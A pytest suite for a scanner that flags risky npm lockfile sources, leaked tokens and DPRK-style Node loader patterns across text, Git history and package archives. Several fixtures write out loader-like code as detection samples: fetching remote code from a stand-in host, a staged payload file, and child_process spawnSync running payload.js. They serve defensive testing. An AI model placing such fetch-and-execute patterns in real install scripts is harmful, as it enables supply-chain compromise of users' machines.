"""Source-aware npm and loader regressions across text, Git and packages."""
import base64
import copy
import hashlib
import io
import json
import subprocess
import tarfile

import pytest

from push_guard.guard import _scan_diff, scan_git_range, scan_text_for_secrets
from push_guard.package_scan import scan_distribution

NPM = "workflow.npm_v12_"
EXEC = "workflow.dprk_socketio_node_exec"
REGISTRY = "https://registry.npmjs.org/example/-/example-1.0.0.tgz"
EXTERNAL = "https://example.invalid/example-1.0.0.tgz"
INTEGRITY = "sha512-" + base64.b64encode(hashlib.sha512(b"fixture").digest()).decode()
CHILD = "child_" + "process"
SPAWN = "spawn" + "Sync"
NODE = "process." + "execPath"
STAGE = "0001" + ".dat"
SERVICE = "/api/" + "service"


def lock():
    return {
        "name": "example", "lockfileVersion": 3, "requires": True,
        "packages": {
            "": {"name": "example", "dependencies": {"example": "1.0.0"}},
            "node_modules/example": {
                "version": "1.0.0", "resolved": REGISTRY, "integrity": INTEGRITY,
                "funding": [{"url": "https://github.com/sponsors/example"},
                            "https://github.com/sponsors/example"],
                "engines": {"npm": ">=8.0.0"},
            },
        },
    }


def rules(value, path="package-lock.json"):
    text = value if isinstance(value, str) else json.dumps(value, indent=2)
    return {f.rule_id for f in scan_text_for_secrets(text, path)}


@pytest.mark.parametrize("path", ["package-lock.json", "npm-shrinkwrap.json", "nested/package-lock.json"])
def test_registry_integrity_funding_and_nested_engine_are_allowed(path):
    assert not rules(lock(), path)


@pytest.mark.parametrize("url", [EXTERNAL, REGISTRY.replace("https:", "http:"),
    REGISTRY.replace("registry.npmjs.org", "registry.npmjs.org.example.invalid"),
    REGISTRY.replace("registry.npmjs.org", "registry.npmjs.org:444"),
    REGISTRY.replace("registry.npmjs.org", "user@registry.npmjs.org"),
    "https://registry.example.invalid/example.tgz"])
def test_nondefault_sources_remain_findings_even_with_integrity(url):
    data = lock()
    data["packages"]["node_modules/example"]["resolved"] = url
    assert NPM + "remote_tarball_dependency" in rules(data)


@pytest.mark.parametrize("integrity", [None, "", "sha512-invalid", "sha512-AAAA", 42])
def test_registry_resolution_needs_a_valid_integrity_shape(integrity):
    data = lock()
    data["packages"]["node_modules/example"]["integrity"] = integrity
    assert NPM + "remote_tarball_dependency" in rules(data)


def test_registry_package_with_hostlike_name_is_not_a_git_source():
    data = lock()
    data["packages"]["node_modules/example"]["resolved"] = REGISTRY.replace("example", "github.com")
    assert not rules(data)


@pytest.mark.parametrize("source", ["github:example/tool", "git+https://example.invalid/tool.git",
    "git://example.invalid/tool", "git@example.invalid:tool.git", "example/tool#v1", "https://example.invalid/tool.git"])
def test_real_git_dependency_sources_remain_findings(source):
    assert NPM + "git_dependency" in rules({"dependencies": {"tool": source}}, "package.json")
    data = lock()
    data["packages"]["node_modules/example"]["dependencies"] = {"tool": source}
    assert NPM + "git_dependency" in rules(data)


def test_manifest_direct_registry_url_has_no_lock_integrity_exemption():
    assert NPM + "remote_tarball_dependency" in rules({"dependencies": {"tool": REGISTRY}}, "package.json")


@pytest.mark.parametrize("selection", [
    {"packageManager": "npm@11.15.0"}, {"engines": {"npm": ">=8.0.0"}},
    {"devEngines": {"packageManager": {"name": "npm", "version": "11.15.0"}}},
])
def test_only_root_npm_selection_is_reported(selection):
    assert NPM + "old_npm_pin" in rules(selection, "package.json")
    data = lock()
    data["packages"][""].update(selection)
    assert NPM + "old_npm_pin" in rules(data)
    data = lock()
    data["packages"]["node_modules/example"].update(selection)
    assert NPM + "old_npm_pin" not in rules(data)


@pytest.mark.parametrize("version", [1, 2])
def test_legacy_nested_lock_records_are_classified(version):
    record = copy.deepcopy(lock()["packages"]["node_modules/example"])
    data = {"lockfileVersion": version, "requires": True, "dependencies": {"example": record}}
    assert not rules(data)
    record["dependencies"] = {"nested": {"version": "1.0.0", "resolved": EXTERNAL, "integrity": INTEGRITY}}
    assert NPM + "remote_tarball_dependency" in rules(data)


@pytest.mark.parametrize("text", [
    '{"dependencies":{"bad":"https://example.invalid/a.tgz"},',
    '{"dependencies":{"bad":"https://example.invalid/a.tgz"},"dependencies":{}}',
    '{"dependencies":{"bad":"https://example.invalid/a.tgz"},"n":NaN}',
])
def test_invalid_or_duplicate_json_does_not_receive_exemptions(text):
    assert NPM + "remote_tarball_dependency" in rules(text, "package.json")


def test_secret_detection_still_scans_ignored_metadata_fields():
    data = lock()
    data["funding"] = "gh" + "p_" + "Q" * 36
    assert "secret.github_token" in rules(data)


def test_fixed_local_test_processes_are_not_loader_findings():
    text = f"import {{ {SPAWN} }} from 'node:{CHILD}';\n{SPAWN}({NODE}, ['tests/run.mjs']);"
    assert EXEC not in rules(text, "scripts/test.mjs")


@pytest.mark.parametrize("signal", [
    f"const endpoint = 'https://example.invalid{SERVICE}';",
    f"const payload = '{STAGE}';",
    "const payload = await fetch('https://example.invalid/code').then(r => r.text());",
])
def test_process_execution_near_loader_context_is_still_reported(signal):
    text = signal + f"\nrequire('{CHILD}').{SPAWN}({NODE}, ['payload.js']);"
    assert EXEC in rules(text, "scripts/install.js")


def test_loader_context_is_nearby_and_does_not_cross_files():
    command = f"require('{CHILD}').{SPAWN}({NODE}, ['tests/run.js']);"
    text = f"const stage = '{STAGE}';\n" + "// context boundary\n" * 45 + command
    assert EXEC not in rules(text, "scripts/check.js")
    diff = ("diff --git a/a.js b/a.js\n+++ b/a.js\n@@ -0,0 +1 @@\n+"
            + f"const stage = '{STAGE}';\n"
            + "diff --git a/b.js b/b.js\n+++ b/b.js\n@@ -0,0 +1 @@\n+" + command)
    assert EXEC not in {f.rule_id for f in _scan_diff(diff)}


def git(repo, *args):
    return subprocess.run(["git", *args], cwd=repo, text=True, capture_output=True, check=True).stdout.strip()


def repository(tmp_path):
    git(tmp_path, "init", "-q")
    git(tmp_path, "config", "user.name", "Fixture")
    git(tmp_path, "config", "user.email", "fixture@example.invalid")
    git(tmp_path, "commit", "--allow-empty", "-qm", "Baseline")
    return git(tmp_path, "rev-parse", "HEAD")


def commit_lock(repo, value):
    (repo / "package-lock.json").write_text(json.dumps(value, indent=2) + "\n")
    git(repo, "add", "package-lock.json")
    git(repo, "commit", "-qm", "Update fixture")
    return git(repo, "rev-parse", "HEAD")


def test_git_scans_complete_commit_context_and_integrity_removal(tmp_path):
    baseline = repository(tmp_path)
    data = lock()
    safe = commit_lock(tmp_path, data)
    assert not scan_git_range(tmp_path, baseline, safe)
    del data["packages"]["node_modules/example"]["integrity"]
    unsafe = commit_lock(tmp_path, data)
    # Dirty working-tree repairs must not influence inspection of the commit.
    (tmp_path / "package-lock.json").write_text(json.dumps(lock()))
    assert NPM + "remote_tarball_dependency" in {f.rule_id for f in scan_git_range(tmp_path, safe, unsafe)}


def test_git_history_retains_findings_removed_before_head(tmp_path):
    baseline = repository(tmp_path)
    data = lock()
    data["packages"]["node_modules/example"]["resolved"] = EXTERNAL
    commit_lock(tmp_path, data)
    head = commit_lock(tmp_path, lock())
    assert NPM + "remote_tarball_dependency" in {f.rule_id for f in scan_git_range(tmp_path, baseline, head)}


def test_git_loader_context_in_unchanged_lines_is_used(tmp_path):
    repository(tmp_path)
    path = tmp_path / "install.js"
    path.write_text(f"const endpoint = 'https://example.invalid{SERVICE}';\n// placeholder\n")
    git(tmp_path, "add", ".")
    git(tmp_path, "commit", "-qm", "Baseline script")
    base = git(tmp_path, "rev-parse", "HEAD")
    path.write_text(path.read_text() + f"require('{CHILD}').{SPAWN}({NODE}, ['payload.js']);\n")
    git(tmp_path, "add", ".")
    git(tmp_path, "commit", "-qm", "Add execution")
    assert EXEC in {f.rule_id for f in scan_git_range(tmp_path, base)}


@pytest.mark.parametrize("unsafe", [False, True])
def test_package_scan_uses_the_same_metadata_rules(tmp_path, unsafe):
    data = lock()
    if unsafe:
        data["packages"]["node_modules/example"]["resolved"] = EXTERNAL
    payload = json.dumps(data).encode()
    archive = tmp_path / "fixture.tgz"
    with tarfile.open(archive, "w:gz") as tar:
        info = tarfile.TarInfo("package/package-lock.json")
        info.size = len(payload)
        tar.addfile(info, io.BytesIO(payload))
    found = {f.rule_id for f in scan_distribution(archive, tmp_path)}
    assert (NPM + "remote_tarball_dependency" in found) is unsafe
